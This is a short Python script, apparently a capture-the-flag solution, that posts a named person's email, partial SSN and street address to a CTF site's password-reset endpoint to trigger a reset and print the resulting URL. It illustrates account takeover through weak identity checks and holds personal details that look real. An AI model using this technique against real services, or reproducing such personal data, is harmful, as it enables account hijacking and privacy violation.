#!/usr/bin/python3
# -*- coding=utf8 -*-
"""
Created by SkyBlueEE on 2018-11-12.
"""
import requests as rq

r = rq.post('https://glacial-coast-79626.squarectf.com/4WzKpfyFbgdEzO3ONxDPpIXdo9Qps5/reset',
            data = {'first_name':'Elyssa',
                    'last_name':'Yakubovics',
                    'email':'eyakubovics9t@nih.gov',
                    'ssn':'4484',
                    'street':'4 Magdeline'})
print(r.url)
